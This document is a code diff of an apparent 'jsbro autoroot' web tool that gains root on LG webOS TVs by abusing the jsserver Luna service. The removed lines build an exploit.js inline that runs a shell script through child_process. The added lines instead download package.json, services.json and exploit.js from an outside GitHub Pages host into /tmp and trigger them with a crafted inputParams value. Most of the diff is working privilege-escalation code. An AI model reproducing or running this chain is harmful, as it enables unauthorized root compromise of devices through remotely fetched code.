@@ -98,23 +98,12 @@
     function runRootExploit() {
       setState('pending', 'preparing root execution...');
 
-      var exploitJs = `var cp = require("child_process"); var fs = require("fs");
-try {
-  cp.execSync("chmod +x ${scriptPath}");
-  cp.execSync("${debugMode ? 'UPLOAD_LOG=1 ' : ''}${scriptPath}");
-  fs.writeFileSync("/tmp/jsbro_root_done", "success");
-} catch(e) {
-  fs.writeFileSync("/tmp/jsbro_root_done", "error:" + e.message);
-}
-module.exports = { run: function(){} };`;
-
-      var pkgJson = '{"name":"com.webos.service.jsserver","main":"exploit.js"}';
-      var svcJson = '{"id":"com.webos.service.jsserver","services":[{"name":"com.webos.service.jsserver"}]}';
+var baseUrl = 'https://allaindb.github.io/jsbro-autoroot-ADB/resources/';
 
       var files = [
-        { name: 'package.json', content: pkgJson },
-        { name: 'services.json', content: svcJson },
-        { name: 'exploit.js', content: exploitJs }
+        { name: 'package.json', url: baseUrl + 'package.json' },
+        { name: 'services.json', url: baseUrl + 'services.json' },
+        { name: 'exploit.js', url: baseUrl + 'exploit.js' }
       ];
       var written = 0;
 
@@ -128,7 +117,7 @@ module.exports = { run: function(){} };`;
           }
         };
         bridge.call('luna://com.webos.service.jsserver/run',
-          JSON.stringify({"inputParams": "-- /tmp/cgroup dummy /tmp"}));
+          JSON.stringify({"inputParams": "-- /tmp/cgroup dummy /media/internal/downloads"}));
 
         setState('pending', 'root exploit running. Watch your TV for the result...');
         var attempts = 0;
@@ -145,6 +134,7 @@ module.exports = { run: function(){} };`;
         var b = new window.PalmServiceBridge();
         b.onservicecallback = function(payload) {
           var parsed = parse(payload);
+          setState('pending', 'file dbg: ' + JSON.stringify(parsed));
           if (isObject(parsed) && parsed.completed === true) {
             written++;
             if (written === files.length) onAllWritten();
@@ -161,9 +151,9 @@ module.exports = { run: function(){} };`;
               JSON.stringify({ ticket: parsed.ticket, subscribe: true }));
           }
         };
-        b.call('luna://com.webos.service.downloadmanager/download',
+b.call('luna://com.webos.service.downloadmanager/download',
           JSON.stringify({
-            target: 'data:text/plain,' + encodeURIComponent(file.content),
+            target: file.url,
             targetDir: '/tmp',
             targetFilename: file.name,
             subscribe: true
@@ -205,6 +195,8 @@ module.exports = { run: function(){} };`;
           setState('pending', parsed.target || parsed.state || 'downloading...');
           return;
         }
+        setState('pending', 'dbg: ' + JSON.stringify(parsed));
+        return;
         settled = true;
         failStep('download status query', 'status query returned an unexpected payload');
       };
